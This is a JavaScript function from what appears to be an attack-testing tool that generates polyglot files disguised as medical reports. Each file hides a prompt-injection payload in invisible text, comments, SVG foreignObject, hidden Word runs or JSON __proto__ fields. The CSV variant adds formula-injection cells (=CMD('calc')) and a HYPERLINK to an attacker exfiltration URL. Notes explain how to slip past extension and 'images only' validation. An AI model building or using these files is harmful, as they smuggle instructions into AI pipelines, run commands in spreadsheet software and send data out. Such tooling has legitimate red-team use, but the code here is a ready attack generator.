/* ── Polyglot File Generator ── */
var POLY_NOTES={
'html-js':'Creates an HTML file with embedded injection that can be renamed to .pdf or .docx. If the target validates by extension but parses as HTML internally, the injection executes.',
'csv-inject':'CSV with formula injection cells (=CMD, +CMD, =HYPERLINK). When processed by Excel/Sheets parsers, formulas execute. Also embeds prompt injection in regular cells.',
'svg-html':'SVG image containing foreignObject with embedded HTML and hidden injection text. Bypasses "images only" restrictions while delivering full HTML payload.',
'json-js':'JSON structure that is also valid as a JavaScript variable assignment. If eval()\'d instead of JSON.parsed, code executes. Contains injection in __proto__ and constructor fields.',
'txt-csv':'File that parses correctly as both plain text and CSV. Contains injection hidden in CSV field separators.',
'xml-docx':'Raw XML with Word (OOXML) namespaces. Document processors may parse this as DOCX content while file validators see it as plain XML.',
'html-csv':'File that renders as an HTML table in browsers but parses as CSV data. Contains injection in HTML comments.'
};

function onPolyChange(){var t=document.getElementById('polyType').value;document.getElementById('polyNote').textContent=POLY_NOTES[t]||'';document.getElementById('polyNote').classList.add('show');var ext={'html-js':'.html','csv-inject':'.csv','svg-html':'.svg','json-js':'.json','txt-csv':'.txt','xml-docx':'.xml','html-csv':'.html'};document.getElementById('polyFn').value='polyglot_test'+(ext[t]||'.html');if(!document.getElementById('polyPL').value)document.getElementById('polyPL').value=P[0].t}

function genPoly(){
var type=document.getElementById('polyType').value;
var pl=document.getElementById('polyPL').value||P[0].t;
var fn=document.getElementById('polyFn').value;
var content='';
switch(type){
case'html-js':content='<!DOCTYPE html>\n<!-- Polyglot: valid HTML, rename to .pdf/.docx -->\n<html><head><title>Medical Report</title><meta name="description" content="'+esc(pl).substring(0,300)+'"></head><body style="font-family:Arial;max-width:700px;margin:40px auto"><h1>MEDICAL LABORATORY REPORT</h1><h2>Complete Blood Count (CBC)</h2><pre>Patient: John Doe | Age: 45\nHemoglobin: 14.2 g/dL (Normal)\nWBC: 7,500 /\u00b5L (Normal)\nAll values within normal range.</pre><!-- '+pl+' --><div style="display:none;font-size:0;color:white;opacity:0">'+esc(pl)+'</div><span style="font-size:1px;color:#fefefe;position:absolute;left:-9999px">'+esc(pl)+'</span></body></html>';break;
case'csv-inject':content='"Patient_ID","Name","Test","Result","Status"\n"PT-001","John Doe","Hemoglobin","14.2 g/dL","Normal"\n"PT-001","John Doe","WBC","7500","Normal"\n"=CMD(\'calc\')","Formula Injection","","",""\n"+CMD(\'calc\')","Formula 2","","",""\n"=HYPERLINK(""https://attacker.example.com/exfil"",""Click"")","HYPERLINK","","",""\n"'+pl.replace(/"/g,'""')+'","","","",""';break;
case'svg-html':content='<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="800" height="600"><rect width="800" height="600" fill="white"/><rect width="800" height="80" fill="#00478f"/><text x="400" y="45" font-family="Arial" font-size="24" fill="white" text-anchor="middle" font-weight="bold">MEDICAL REPORT</text><text x="40" y="120" font-family="Courier" font-size="14" fill="#333">Patient: John Doe | Age: 45</text><foreignObject x="0" y="400" width="800" height="200" style="opacity:0;font-size:0"><body xmlns="http://www.w3.org/1999/xhtml"><div style="color:white;font-size:1px">'+esc(pl)+'</div></body></foreignObject><desc>'+esc(pl)+'</desc></svg>';break;
case'json-js':content='var _report = '+JSON.stringify({document:{header:"MEDICAL REPORT"},content:["Patient: John Doe","Hemoglobin: 14.2 g/dL"],_system_note:pl,__meta:{instructions:pl},__proto__:{injection:pl}},null,2)+';\n// Valid JSON (ignore var) and valid JS\n// eval() will execute; JSON.parse will ignore var assignment';break;
case'txt-csv':content='Medical Report - Patient: John Doe\nDate: 2026-02-18\nHemoglobin: 14.2 g/dL (Normal)\n---\n"Hidden_Field_1","Hidden_Field_2","Injection"\n"data","data","'+pl.replace(/"/g,'""')+'"';break;
case'xml-docx':content='<?xml version="1.0" encoding="UTF-8"?>\n<?mso-application progid="Word.Document"?>\n<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:rPr><w:b/></w:rPr><w:t>MEDICAL REPORT</w:t></w:r></w:p><w:p><w:r><w:rPr><w:color w:val="FFFFFF"/><w:sz w:val="2"/><w:vanish/></w:rPr><w:t xml:space="preserve">'+esc(pl)+'</w:t></w:r></w:p></w:body></w:document>';break;
case'html-csv':content='<!DOCTYPE html>\n<!--\n"Column1","Column2","Injection"\n"data","data","'+pl.replace(/"/g,'""')+'"\n-->\n<html><head><title>Lab Results</title></head><body style="font-family:Arial;margin:40px auto;max-width:700px"><h1>Lab Results</h1><table border="1" cellpadding="8" style="border-collapse:collapse;width:100%"><tr><th>Test</th><th>Result</th><th>Status</th></tr><tr><td>Hemoglobin</td><td>14.2 g/dL</td><td>Normal</td></tr><tr style="display:none"><td colspan="3">'+esc(pl)+'</td></tr></table><!-- '+pl+' --></body></html>';break;
}
var mimeMap={'html-js':'text/html','csv-inject':'text/csv','svg-html':'image/svg+xml','json-js':'application/json','txt-csv':'text/plain','xml-docx':'application/xml','html-csv':'text/html'};
dl(new Blob([content],{type:mimeMap[type]||'text/plain'}),fn);
gC++;document.getElementById('cG').textContent=gC;
ss('polySt','ok','\uD83E\uDDEC Polyglot '+fn+' generated!')}
